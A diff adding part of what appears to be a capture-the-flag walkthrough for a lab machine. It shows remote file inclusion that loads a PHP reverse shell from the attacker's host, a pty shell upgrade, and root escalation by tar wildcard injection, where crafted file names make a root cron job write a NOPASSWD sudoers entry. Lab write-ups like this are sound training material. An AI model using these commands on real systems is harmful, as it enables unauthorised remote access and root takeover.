@@ -129,6 +129,59 @@ sudo Python3 -m http.server 80
 
 ![image](https://user-images.githubusercontent.com/71508714/169669752-3e654633-293f-4f24-a8d7-8c6637332649.png)
 
+Now, open the following URL in your browser: http://10.10.67.236/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.50.72:8000/php-reverse-shell.php. You should have a reverse shell:
+
+![image](https://user-images.githubusercontent.com/71508714/169669792-f7c3feb6-e188-4cbd-af20-7265658774fa.png)
+
+Privilege Escalation
+
+So my usual steps into enumerate linux boxes usually are to check for sudo permissions, crontab jobs running and to get a linpeas script and run an automated enumeration in order to look for clues.
+
+Since we have a dumb shell, we need to upgrade it to a interactive tty shell, using the following Python command:
+
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+
+We can check for the sudo permissions with the sudo -l command:
+
+![image](https://user-images.githubusercontent.com/71508714/169669821-f9513c05-676a-4705-a902-7600a2914d8a.png)
+
+So we don’t have permissions to check if we can run something as sudo. Let’s try to enumerate crontab instead:
+
+![image](https://user-images.githubusercontent.com/71508714/169669839-52deec70-ef67-4e11-8868-2741b5c98057.png)
+
+Ok, we can see that there is some backup.sh running every minute. Let’s check the permissions on that folder or script:
+
+![image](https://user-images.githubusercontent.com/71508714/169669856-5268ab18-203a-4516-af2a-e3c179c2b896.png)
+
+
+![image](https://user-images.githubusercontent.com/71508714/169669873-bca0ab95-08d9-4f65-9853-f5b3144793e7.png)
+
+o as we can see, this script runs as root, changes directory to ‘/var/www/html’ and then uses tar to compress the content of the directory into a file called backup.tgz at ‘/home/milesdyson/backups’.
+
+We could check for a possible attack vector, in the gtfobins page but since only the script is allowed to run tar as root, there is not much we can use from there. After a couple of searches, I’ve found a potential Linux privilege escalation using wildcard injection. Basically, tar allows the usage of 2 options that can be used for poisoning, in order to force the binary to execute unintended actions:
+
+checkpoint[=NUMBER] — this option displays progress messages every NUMBERth record (default value is 10)
+checkpoint-action=ACTION — this option executes said ACTION on each checkpoint
+By forcing tar to use these options, we can use a specific action with the permissions of the user that is running the command, which in our case is root.
+
+So, in order to take advantage of this, let’s create a script to add our user to sudoers and gain root while on the machine:
+
+echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh
+touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
+touch "/var/www/html/--checkpoint=1"
+
+After running all three commands in our /var/www/html, we should have 3 new files laying around inside the directory that is getting backed up:
+
+![image](https://user-images.githubusercontent.com/71508714/169669902-6a192e41-9a4a-4a4e-9c3a-124a6d9196d3.png)
+
+Now, after a minute, the cronjob should have been executed, and we can get our root access by just using sudo su:
+
+![image](https://user-images.githubusercontent.com/71508714/169669920-d3b2cac6-4f12-492c-a943-0bf64c12cf4a.png)
+
+
+
+
+
 
 
 
